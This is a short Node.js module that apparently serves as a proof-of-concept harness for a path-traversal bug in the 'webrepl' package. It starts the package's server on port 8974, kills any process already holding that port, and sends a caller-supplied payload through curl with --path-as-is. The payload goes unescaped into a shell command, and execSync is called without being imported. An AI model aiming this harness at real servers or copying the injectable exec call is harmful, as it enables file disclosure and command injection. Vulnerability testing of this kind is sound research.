function exploitFunction(payload) {
  const pkg = require("webrepl");
  const fs = require("fs");
  const { exec } = require("child_process");

  try {
    execSync("fuser -k 8974/tcp", () => {});
  } catch (e) {}

  pkg.start(8974);

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8974/${payload}"`;
  return new Promise((resolve, reject) => {
    exec(attack_string, (error, stdout) => {
      if (error) {
        reject(error);
      } else {
        resolve(stdout);
      }
    });
  });
}

module.exports = { exploitFunction };